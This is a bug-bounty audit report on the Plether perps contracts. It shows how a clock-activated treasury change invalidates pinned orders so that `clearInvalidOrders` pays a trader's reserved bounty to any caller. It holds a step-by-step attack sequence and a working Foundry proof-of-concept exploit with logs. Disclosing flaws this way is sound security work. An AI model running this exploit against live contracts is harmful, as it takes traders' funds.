# \#100068 [SC-Low] Scheduled treasury succession flips `currentExecutionConfigHash` by clock alone; `clearInvalidOrders` pays the victim's trader-funded bounty to the pruning caller

**Submitted on Nov 16th 2026 at 07:17:14 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100068
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Theft of unclaimed yield
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
`CfdTreasury` lets the owner schedule a successor treasury that activates purely by timestamp — no transaction at activation. `currentExecutionConfigHash()` binds the resolved `protocolTreasury()`, so every config-pinned order becomes hash-invalid the moment the lock expires. Anyone can then call `clearInvalidOrders`, which terminalizes such orders as `ConfigMismatch` and pays their reserved, trader-funded execution bounty to the *caller* instead of refunding the trader. The bounty is never returned to the account that funded it.

## Vulnerability Details

**1. A scheduled treasury activates with no transaction.** The owner commits a treasury with a lock and schedules a successor (`packages/perps/src/CfdTreasury.sol:136-147` and `:70-89`):

```solidity
function setProtocolTreasury(address treasury, uint256 lockDuration) external onlyOwner {
    ...
    _setProtocolTreasury(treasury);
    uint256 lockedUntil = block.timestamp + lockDuration;
    _currentTreasury.lockedUntil = lockedUntil;
    emit ProtocolTreasuryLocked(treasury, lockedUntil);
}
```

Resolution is timestamp-based (`packages/perps/src/CfdTreasury.sol:101-105`):

```solidity
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;
    }
    ...
```
From the documentation: *"At the original expiry, the latest pending treasury automatically becomes the recipient of future protocol fees. No confirmation or keeper transaction is required."* This is a normal, documented governance pattern (treasury rotations are routine), and the activation timestamp is public from the moment of proposal.

**2. The live execution-config hash binds the resolved treasury.** `packages/perps/src/OrderLifecycleBook.sol:172-203`:

```solidity
bytes memory engineConfig = abi.encode(
    engine.planner(),
    engine.settlementSidecar(),
    engine.terminalNavBook(),
    engineAdmin,
    IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
    engine.protocolTreasury(),                                          // :199
    IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
);
return keccak256(bytes.concat(routerConfig, engineConfig));
```

Because `protocolTreasury()` resolves by timestamp, `currentExecutionConfigHash()` changes **spontaneously at the scheduled activation**, with no on-chain event at the flip. The intent is documented: *"identity and finalized policy drift produces terminal `ConfigMismatch` for config-pinned external orders"* — the order-failure side is intended; the bounty side below is the problem.

**3. The bounty is the trader's own money.** Every external V3 open order is auto-sized a bounty and reserves it **from the trader's free settlement** (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:448-455`, `packages/perps/src/router/OrderReservationAccounting.sol:108-128`):

```solidity
executionBountyAssets = (notionalAssets * host.openOrderExecutionBountyBps()) / 10_000;
...
if (clearinghouse.getAccountAssetBuckets(account).freeSettlementAssets < bounty) {
    revert OrderRouter__InsufficientFreeEquity();
}
clearinghouse.lockReservedSettlement(account, bounty);
```

**4. Anyone can prune hash-invalid orders — and is paid the bounty for it.** `clearInvalidOrders` is permissionless and detects config-invalid orders by comparing the pinned hash to the live one (`packages/perps/src/OrderRecoverySidecar.sol:87-113`), constructing the cleanup item with `request.executor = msg.sender` (`:120-137`):

```solidity
bool configInvalid = pending.bounds.expectedConfigHash != bytes32(0)
    && pending.bounds.expectedConfigHash != observedConfigHash;
...
IOrderRouterExecutionHost.ItemRequest memory request =
    _cleanupRequest(host, orderId, expired, observedConfigHash);   // executor = msg.sender
```

The item settles through `settleNonEngine` → `_settle` → `settleOrderFromSidecar(false, ConfigMismatch, bountyRecipient = request.executor)` (`packages/perps/src/OrderRecoverySidecar.sol:165-225`), landing in `_settleTerminalBounty` (`packages/perps/src/OrderRouter.sol:331-347`):

```solidity
if (bountyAssets != 0) {
    settlement.bountyRecipient = bountyRecipient;
    settlement.bountyDisposition = OrderV3Types.BountyDisposition.Paid;
    if (bountyRecipient == order.account) {
        clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
    } else {
        engine.creditBounty(order.account, bountyRecipient, bountyAssets, accountingPrice, accountingPublishTime);
    }
}
```

The refund branch (`bountyRecipient == order.account`) is unreachable from `clearInvalidOrders`: the executor is always the external caller. So the trader-funded bounty is credited as free settlement to whoever prunes the order — bounty `Paid`, not `RefundedToAccount`.

**Attack sequence (single unprivileged transaction after the clock passes the activation):**

1. Owner performs an ordinary treasury rotation: `setProtocolTreasury(t1, L)` and `proposeProtocolTreasury(t2, ...)`. Activation timestamp `T = now + L` is now public. This is not malicious — it is the documented purpose of the scheduling feature.
2. Before `T`, a trader commits any funded open order (bounty auto-reserved from her free settlement) with the default config-pinned `expectedConfigHash`. Orders live up to `maxExecutionWindowSeconds` (default 60s cap per config) and pending-order slots persist up to that window; keepers routinely execute them, but any order still pending within its window at `T` qualifies.
3. At `T`, the successor activates silently; the live hash changes. The trader's order is now config-invalid while still inside its execution window.
4. An attacker calls `clearInvalidOrders([orderId])`. The order terminalizes as `Failed/ConfigMismatch`, and the reserved bounty — the trader's own funds — is credited to the attacker's clearinghouse account.

The trader cannot defend: the hash flip needs no transaction (nothing to frontrun), the bounty was already locked at commit, and executing her own order after `T` fails the same config check in `_preOracleAction` (`packages/perps/src/OrderRouterExecutionSidecar.sol:913-917`) — where, notably, if she executes it herself as `bountyRecipient == order.account` she *would* get the refund branch, but the moment anyone else prunes or executes the ConfigMismatch path first, the bounty is gone.

## Impact Details

Any trader holding a funded, config-pinned open order across a scheduled treasury activation loses her reserved execution bounty (default sizing: 1 bp of notional, min 0.1 / max 20 USDG-equivalents under default config; larger under configured values) to whoever calls `clearInvalidOrders` first. The loss is exactly the reserved bounty — the order's committed margin is released properly, so the direct financial damage is bounded by the bounty, but it is a straight transfer from the trader to a stranger for a failure the trader did not cause: the invalidation comes from a scheduled governance rotation, not from her order's inputs. The order itself is terminally failed, so a trader who intended to open a position must re-commit (new fees, new bounty, new price exposure). Repeated across all pending pinned orders at every scheduled activation, the pruning caller harvests every outstanding bounty in one call (`clearInvalidOrders` accepts up to `maxPruneOrdersPerCall` ids).



## References

- `packages/perps/src/CfdTreasury.sol:101-105` — `_activeTreasury()` timestamp-only successor activation; `:136-147` lock-and-schedule setter; `:70-89` successor proposal.
- `packages/perps/src/OrderLifecycleBook.sol:172-203` — `currentExecutionConfigHash()` binds `engine.protocolTreasury()` at `:199`.
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:448-455` — bounty auto-sizing; `packages/perps/src/router/OrderReservationAccounting.sol:108-128` — bounty locked from the trader's free settlement.
- `packages/perps/src/OrderRecoverySidecar.sol:87-137` — `clearInvalidOrders` config-invalid detection and `executor = msg.sender` cleanup request.
- `packages/perps/src/OrderRecoverySidecar.sol:165-225` — `settleNonEngine`/`_settle` passing the caller as bounty recipient.
- `packages/perps/src/OrderRouter.sol:331-347` — `_settleTerminalBounty`: refund branch unreachable for external pruners; `creditBounty` to the caller.
- `packages/perps/src/OrderRouterExecutionSidecar.sol:913-917` — pre-oracle terminal `ConfigMismatch` classification.
- documentation  — treasury scheduling semantics ("No confirmation or keeper transaction is required"), config-hash composition, `ConfigMismatch` terminal outcomes.

## Proof of Concept

## Proof of Concept

Create and run the test file below:

```bash
forge test --match-path test/perps/TreasuryAutoActivationBountyPoC.t.sol -vv
```

```solidity

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {Vm} from "forge-std/Vm.sol";

/// @title TreasuryAutoActivationBountyPoC
/// @notice A scheduled treasury succession activates by timestamp alone, flipping
///         currentExecutionConfigHash, so config-pinned open orders become terminally
///         ConfigMismatch and clearInvalidOrders pays their trader-funded reserved
///         bounty to the pruning caller instead of refunding the trader.
///
/// Mechanism (all production paths):
///   1. Owner calls engine.setProtocolTreasury(t1, lock) then engine.proposeProtocolTreasury(t2, ...)
///      — an ordinary, documented governance operation (CfdTreasury.sol:136-147, 70-89).
///   2. A trader commits a funded, config-pinned open order before the lock expiry. Its
///      execution bounty is locked from the trader's own free settlement
///      (OrderReservationAccounting.sol:108-128; bounty auto-sized at
///      OrderLiquidationBatchLogic.sol:448-455).
///   3. At lockedUntil the successor becomes effective with NO transaction
///      (CfdTreasury._activeTreasury:101-105; doc: "no confirmation or keeper
///      transaction is required"). currentExecutionConfigHash() includes
///      engine.protocolTreasury() (OrderLifecycleBook.sol:199), so the live hash
///      changes purely by clock passage.
///   4. Any attacker calls router.clearInvalidOrders([orderId])
///      (OrderRecoverySidecar.sol:67-113): the item settles as terminal
///      ConfigMismatch with request.executor = msg.sender (:127).
///   5. settleNonEngine -> _settle -> settleOrderFromSidecar(false, ConfigMismatch,
///      bountyRecipient=caller) -> _settleTerminalBounty: bountyRecipient != order.account
///      -> engine.creditBounty(account, CALLER, bounty) (OrderRouter.sol:331-347).
///      The trader's reserved bounty is credited to the attacker as free settlement;
///      the trader's order is deleted with a permanent Failed receipt.
///
/// Control: an identical order before the treasury activation executes normally.
contract TreasuryAutoActivationBountyPoC is BasePerpTest {

    address trader = address(0x7ADE1);
    address attacker = address(0xA77AC);
    address treasuryOne = address(0x7EAF1);
    address treasuryTwo = address(0x7EAF2);

    uint256 constant OPEN_SIZE = 10_000e18;
    uint256 constant OPEN_MARGIN = 1_000e6;

    function _request(
        CfdTypes.Side side
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("poc", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = OPEN_SIZE;
        request.marginDelta = OPEN_MARGIN;
        request.isClose = false;
        request.targetPrice = 1; // open LONG accepts any price >= target
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(), // config-pinned
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _receiptOf(
        uint64 id
    ) internal returns (OrderV3Types.OrderReceipt memory receipt) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(router.lifecycleBook()) && logs[i].topics.length == 4
                    && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector
                    && uint256(logs[i].topics[1]) == id
            ) {
                (,, uint64 t, OrderV3Types.OrderReceipt memory found) =
                    abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                assertTrue(router.lifecycleBook().verifyReceipt(found, t), "receipt must authenticate");
                return found;
            }
        }
        revert("no terminal receipt");
    }

    function test_TreasuryAutoActivationFlipsHashAndPaysBountyToPruningCaller() public {
        // ---- Control: same setup without the scheduled succession executes normally ----
        _fundTrader(trader, 10_000e6);
        OrderV3Types.OrderRequest memory controlReq = _request(CfdTypes.Side.LONG);
        vm.prank(trader);
        uint64 controlId = router.commitOrder(controlReq);
        vm.recordLogs();
        vm.prank(attacker);
        OrderV3Types.ExecutionResult memory controlResult = router.executeOrder(controlId, _mockPythUpdateData(1e8));
        OrderV3Types.OrderReceipt memory controlReceipt = _receiptOf(controlId);
        assertEq(
            uint8(controlReceipt.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "control: identical pinned open executes before any treasury change"
        );
        (uint256 controlSize,,,,,,) = engine.positions(trader);
        assertEq(controlSize, OPEN_SIZE, "control: position opened");
        emit log_named_uint("control bounty paid on execution", controlReceipt.bountyAssets);

        // Trader closes the control position so account state is clean for the attack.
        OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG);
        closeReq.isClose = true;
        closeReq.sizeDelta = OPEN_SIZE;
        closeReq.marginDelta = 0;
        closeReq.targetPrice = 2e8; // close LONG accepts any price <= target
        vm.prank(trader);
        uint64 closeId = router.commitOrder(closeReq);
        vm.prank(attacker);
        router.executeOrder(closeId, _mockPythUpdateData(1e8));
        (controlSize,,,,,,) = engine.positions(trader);
        assertEq(controlSize, 0, "control position closed");

        // ---- Attack setup: owner locks a treasury and schedules a successor ----
        vm.startPrank(address(this)); // engine owner in the test fixture
        engine.setProtocolTreasury(treasuryOne, 1 days); // immediate + 1-day lock
        engine.proposeProtocolTreasury(treasuryTwo, 30 days); // successor at the 1-day expiry
        vm.stopPrank();
        uint256 activation = engine.protocolTreasuryLockedUntil();
        emit log_named_uint("scheduled treasury activation timestamp", activation);

        // Trader commits a funded, config-pinned open ONE BLOCK before the treasury activation,
        // so at activation it is config-invalid but still inside its execution window.
        vm.warp(activation - 1);
        OrderV3Types.OrderRequest memory openReq = _request(CfdTypes.Side.LONG);
        openReq.bounds.executionWindowSeconds = 60;
        vm.prank(trader);
        uint64 openId = router.commitOrder(openReq);
        vm.warp(activation); // the scheduled successor activates with no transaction

        uint256 bounty = clearinghouse.getBountyReservation(IMarginClearinghouse.BountyKind.Order, openId).amountAssets;
        // Capture the pre-attack-run custodial snapshot. Note: the trader's settlement BALANCE already
        // excludes the reserved bounty (reservation moved it into the locked bucket); the correct
        // pre-cleanup comparison basis is balance + locked bounty + committed margin.
        IMarginClearinghouse.AccountAssetBuckets memory preBuckets = clearinghouse.getAccountAssetBuckets(trader);
        uint256 traderCustodyBefore = preBuckets.settlementBalanceAssets;
        uint256 attackerBalanceBefore = clearinghouse.balanceAssets(attacker);
        emit log_named_uint("trader-funded reserved bounty", bounty);
        assertTrue(bounty > 0, "open order must carry a trader-funded bounty");

        bytes32 pinnedHash = openReq.bounds.expectedConfigHash;

        // ---- Time passed: the successor treasury activated with NO transaction ----
        assertNotEq(engine.protocolTreasury(), treasuryOne, "successor treasury is now effective");
        assertEq(engine.protocolTreasury(), treasuryTwo, "successor treasury is now effective (two)");
        assertNotEq(
            router.lifecycleBook().currentExecutionConfigHash(),
            pinnedHash,
            "execution config hash flipped purely by clock passage"
        );

        // ---- Attacker prunes the now config-invalid order and collects the bounty ----
        uint64[] memory ids = new uint64[](1);
        ids[0] = openId;
        vm.recordLogs();
        vm.prank(attacker);
        (, uint256 cleared) = router.clearInvalidOrders(ids);
        assertEq(cleared, 1, "attacker cleared the config-invalid order");

        OrderV3Types.OrderReceipt memory receipt = _receiptOf(openId);
        emit log_named_uint("terminal status (3 = Failed)", uint8(receipt.status));
        emit log_named_uint("terminal reason (4 = ConfigMismatch)", uint8(receipt.reason));
        emit log_named_uint("bounty disposition (1 = Paid)", uint8(receipt.bountyDisposition));
        emit log_named_uint("bounty paid to", uint256(uint160(receipt.bountyRecipient)));

        assertEq(uint8(receipt.status), uint8(OrderV3Types.LifecycleStatus.Failed), "order terminally failed");
        assertEq(
            uint8(receipt.reason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "reason must be ConfigMismatch"
        );
        assertEq(
            uint8(receipt.bountyDisposition),
            uint8(OrderV3Types.BountyDisposition.Paid),
            "bounty marked Paid (not refunded)"
        );
        assertEq(receipt.bountyRecipient, attacker, "bounty recipient must be the pruning caller");
        assertEq(receipt.bountyAssets, bounty, "full reserved bounty paid out");

        // The trader's funds moved to the attacker, not back to the trader.
        uint256 attackerGain = clearinghouse.balanceAssets(attacker) - attackerBalanceBefore;
        int256 traderDelta = int256(clearinghouse.balanceAssets(trader)) - int256(traderCustodyBefore);
        emit log_named_uint("attacker free-settlement gain", attackerGain);
        emit log_named_int("trader balance delta after cleanup", traderDelta);
        assertEq(attackerGain, bounty, "attacker received the full trader-funded bounty");
        assertEq(
            clearinghouse.getBountyReservation(IMarginClearinghouse.BountyKind.Order, openId).amountAssets,
            0,
            "bounty reservation consumed"
        );
        assertEq(router.pendingOrderCounts(trader), 0, "no pending orders remain for the trader");

        // The trader never opened the position and lost the bounty to a stranger.
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, 0, "trader never received the position");
        // The bounty was locked from the trader's free settlement at commit; after cleanup the
        // attacker holds it. The trader got everything back EXCEPT the bounty.
        assertEq(
            traderDelta,
            -int256(bounty),
            "trader's settlement balance is lower by exactly the bounty that went to the attacker"
        );
    }
}

```



**Test flow:**

1. **Control:** the trader commits an identical config-pinned funded open and a keeper executes it — `Executed`, position opened, bounty paid for real work. The control position is then closed, leaving a clean account.
2. Owner (test contract) calls `engine.setProtocolTreasury(treasuryOne, 1 days)` and `engine.proposeProtocolTreasury(treasuryTwo, 30 days)` — the documented scheduling flow.
3. One second before the activation timestamp, the trader commits the same funded, config-pinned open (bounty 200,000 reserved from her free settlement).
4. `vm.warp(activation)` — **no transaction** — assertions confirm the successor is effective and `currentExecutionConfigHash()` has changed.
5. The attacker calls `router.clearInvalidOrders([openId])`.
6. Assertions: terminal `Failed` / `ConfigMismatch`, bounty disposition `Paid`, recipient = attacker, full bounty amount; attacker's clearinghouse balance `+200,000`; trader's balance delta exactly `−200,000`; bounty reservation consumed; no pending orders remain; trader's position size still zero.

Logs:


```
Ran 1 test for test/perps/TreasuryAutoActivationBountyPoC.t.sol:TreasuryAutoActivationBountyPoC
[PASS] test_TreasuryAutoActivationFlipsHashAndPaysBountyToPruningCaller() (gas: 8555464)
Logs:
  control bounty paid on execution: 200000
  scheduled treasury activation timestamp: 1709622002
  trader-funded reserved bounty: 200000
  terminal status (3 = Failed): 3
  terminal reason (4 = ConfigMismatch): 4
  bounty disposition (1 = Paid): 1
  bounty paid to: 685996
  attacker free-settlement gain: 200000
  trader balance delta after cleanup: -200000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.99ms (9.90ms CPU time)

Ran 1 test suite in 20.32s (17.99ms CPU time): 1 tests passed; 0 failed; 0 skipped (1 total)
```

Reading the log: `bounty paid to: 685996` = `0xA77aC`, the attacker. The identical pinned order that *executed* in the control (paying its bounty for genuine keeper work) is terminally `ConfigMismatch`ed after the clock-only treasury flip, and its entire trader-funded bounty of 200,000 (0.2 USDG) transfers to the pruning caller — the trader's settlement balance drops by exactly that amount (perfect conservation, no other leakage).
